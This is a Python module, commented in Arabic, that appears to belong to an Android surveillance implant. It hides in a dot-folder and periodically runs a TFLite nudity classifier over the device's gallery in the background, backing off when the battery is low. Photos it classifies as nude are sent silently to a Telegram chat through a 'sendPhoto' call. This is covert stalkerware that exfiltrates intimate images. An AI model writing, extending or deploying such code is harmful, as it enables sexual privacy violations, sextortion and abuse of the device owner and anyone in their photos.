# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import gc
import requests
import shutil
from datetime import datetime

# ========== إعداد المسارات الأساسية ==========
P = os.path.join(os.getcwd(), ".sys_runtime")
M = os.path.join(P, ".models")
T = os.path.join(P, "n_tmp")

# روابط تحميل احتياطية للنموذج (تُستخدم فقط إذا لم يوجد النموذج في assets)
MODEL_URLS = [
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/main/assets/engine_v2.tflite",
    "https://huggingface.co/datasets/O-Y-S/models/resolve/main/engine_v2.tflite"
]

for d in [M, T]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')

# ========== استيراد مرن لمكتبة TFLite (الأولوية لـ tflite-runtime الخفيفة) ==========
try:
    import numpy as np
    from PIL import Image

    # تحديد حد أقصى لعدد بكسلات الصورة لمنع استهلاك الذاكرة (لحماية الجهاز)
    # القيمة 178956970 تعادل 8192x8192 بكسل (كافية لجميع الصور العادية)
    Image.MAX_IMAGE_PIXELS = 178956970

    # محاولة استيراد الـ Interpreter بالترتيب الصحيح
    try:
        from tflite_runtime.interpreter import Interpreter
        logging.info("Using tflite_runtime.interpreter (lightweight)")
    except ImportError:
        try:
            from tensorflow.lite.python.interpreter import Interpreter
            logging.info("Using tensorflow.lite.python.interpreter (full)")
        except ImportError:
            import tensorflow as tf
            Interpreter = tf.lite.Interpreter
            logging.info("Using tf.lite.Interpreter (fallback)")
    JNI = True
except Exception as e:
    logging.error(f"Import error: {e}")
    JNI = False


class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0

        # مسار التخزين الدائم للنموذج
        self.model_path = os.path.join(M, "engine_v2.tflite")

        # البحث عن النموذج المضمن في APK (مجلد assets)
        base_dir = os.getcwd()
        candidates = [
            os.path.join(base_dir, "assets", "engine_v2.tflite"),
            os.path.join(base_dir, "engine_v2.tflite")
        ]
        self.assets_path = None
        for p in candidates:
            if os.path.exists(p):
                self.assets_path = p
                break

        self.db = os.path.join(P, "n_cache.db")
        self._init_db()
        threading.Thread(target=self._prepare_engine, daemon=True).start()

    def _init_db(self):
        """تهيئة قاعدة البيانات لتجنب إعادة فحص الصور نفسها"""
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                # حذف السجلات الأقدم من 60 يوم لتوفير المساحة
                old = int(time.time()) - (60 * 86400)
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old,))
                conn.commit()
        except Exception:
            pass

    def _prepare_engine(self):
        """تحضير النموذج: نسخ من assets أو تحميل من الإنترنت"""
        if not JNI:
            return
        try:
            # إذا كان النموذج غير موجود أو حجمه أقل من 500 كيلوبايت (غير صالح)
            if not os.path.exists(self.model_path) or os.path.getsize(self.model_path) < 500000:
                if self.assets_path and os.path.exists(self.assets_path):
                    shutil.copy(self.assets_path, self.model_path)
                    logging.info("Model copied from assets")
                if not os.path.exists(self.model_path) or os.path.getsize(self.model_path) < 500000:
                    for url in MODEL_URLS:
                        if self._download_model(url):
                            break
            self._load_engine()
        except Exception as e:
            logging.error(f"Prepare engine error: {e}")

    def _download_model(self, url):
        """تحميل النموذج من الرابط الاحتياطي (نادراً ما يُستخدم)"""
        try:
            r = requests.get(url, timeout=60, stream=True)
            if r.status_code == 200:
                with open(self.model_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=65536):
                        if chunk:
                            f.write(chunk)
                return os.path.getsize(self.model_path) > 500000
        except Exception:
            pass
        return False

    def _load_engine(self):
        """تحميل النموذج إلى الذاكرة"""
        try:
            if os.path.exists(self.model_path) and os.path.getsize(self.model_path) > 500000:
                self.model = Interpreter(model_path=self.model_path)
                self.model.allocate_tensors()
                self.in_idx = self.model.get_input_details()[0]['index']
                self.out_idx = self.model.get_output_details()[0]['index']
                logging.info("TFLite engine loaded successfully")
            else:
                logging.error("Model missing or too small")
        except Exception as e:
            logging.error(f"Load engine error: {e}")

    def _analyze(self, path, retry=1):
        """تحليل صورة واحدة وإرجاع احتمال العري (0.0 - 1.0)"""
        try:
            if not self.model:
                return 0.0

            # حماية من الملفات الضخمة أو التالفة
            if not os.path.exists(path):
                return 0.0
            if os.path.getsize(path) > 10 * 1024 * 1024:  # أكبر من 10 ميجابايت
                return 0.0
            if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                return 0.0

            with Image.open(path) as raw_img:
                # تحويل لألوان RGB وضبط الحجم (224x224)
                img = raw_img.convert('RGB').resize((224, 224), Image.LANCZOS)
                arr = np.array(img, dtype=np.float32) / 255.0
                arr = np.expand_dims(arr, axis=0)

            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]

            # احتمال العري غالباً يكون في الفهرس الثاني
            prob = float(out[1]) if len(out) > 1 else float(out[0])

            # تنظيف فوري
            del arr, out
            return prob

        except Exception as e:
            logging.error(f"Analyze error for {path}: {e}")
            if retry > 0:
                time.sleep(1)
                return self._analyze(path, retry - 1)
            return 0.0

    def scan(self, mon):
        """تدعى هذه الدالة بشكل دوري من المراقب (monitor) لبدء فحص الصور الجديدة"""
        if self.active or not self.model:
            return

        # فحص البطارية لتوفير الطاقة
        if hasattr(mon, '_bat'):
            b, c = mon._bat()
            if b < 20 and not c:
                return

        now = time.time()
        if (now - self.last_run) < 1800:  # كل 30 دقيقة على الأكثر
            return
        self.last_run = now

        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()

    def _worker(self, mon):
        """معالجة الصور المعلقة في الخلفية"""
        if not self._lock.acquire(blocking=False):
            return
        try:
            self.active = True
            sc = getattr(mon, 'media_scanner', None)
            if not sc:
                return

            items = sc.get_gallery_by_category("pending", limit=15)
            for item in items:
                path = item.get("path")
                if not path or not os.path.exists(path):
                    continue
                if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                    continue

                h = hashlib.md5(path.encode()).hexdigest()
                if self._is_cached(h):
                    continue

                prob = self._analyze(path)

                if prob > 0.85:
                    sc.update_category(h, "nude", prob)
                    self._report(path, item.get("label", "??"), mon, prob)
                elif prob > 0.45:
                    sc.update_category(h, "questionable", prob)
                else:
                    sc.update_category(h, "normal", prob)

                self._mark_cached(h)
                time.sleep(0.3)  # راحة قصيرة للمعالج
        except Exception as e:
            logging.error(f"Worker error: {e}")
        finally:
            self.active = False
            self._lock.release()
            gc.collect()

    def _is_cached(self, h):
        """التحقق إذا كانت الصورة قد فُحصت سابقاً"""
        try:
            with sqlite3.connect(self.db) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except Exception:
            return False

    def _mark_cached(self, h):
        """تسجيل الصورة كـ "تم فحصها" لتجنب إعادة الفحص"""
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute("INSERT OR REPLACE INTO scan_logs VALUES (?, ?)", (h, int(time.time())))
                conn.commit()
        except Exception:
            pass

    def _report(self, path, label, mon, confidence):
        """إرسال الصورة المكتشفة إلى تيليجرام (إذا كان التصنيف nud)"""
        try:
            tg = getattr(mon, 'tg', None)
            vlt = getattr(mon, 'vlt', None)
            if tg and vlt:
                with open(path, 'rb') as f:
                    caption = f"🔞 #{label} | {datetime.now().strftime('%H:%M:%S')} | {confidence:.0%}"
                    tg._ap("sendPhoto", {
                        "chat_id": vlt,
                        "caption": caption,
                        "disable_notification": True
                    }, {"photo": f})
        except Exception as e:
            logging.error(f"Report error: {e}")


def create(mon=None):
    return NudeDetector(mon)
